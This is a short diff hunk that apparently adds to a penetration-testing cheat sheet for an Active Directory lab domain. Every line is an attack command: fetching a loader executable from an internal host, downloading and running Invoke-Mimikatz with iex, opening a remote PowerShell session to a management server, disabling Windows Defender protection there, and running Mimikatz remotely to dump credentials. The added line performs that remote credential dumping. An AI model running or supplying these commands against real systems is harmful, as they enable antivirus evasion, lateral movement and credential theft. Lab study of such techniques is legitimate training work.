@@ -74,3 +74,5 @@ C:\Users\Public\AssemblyLoad.exe http://192.168.100.75/Loader.exe -path http://1
 iex ((New-Object Net.WebClient).DownloadString('https://172.16.100.75/Invoke-Mimikatz.ps1'))
 $sess = New-PSSsession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
 Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
+
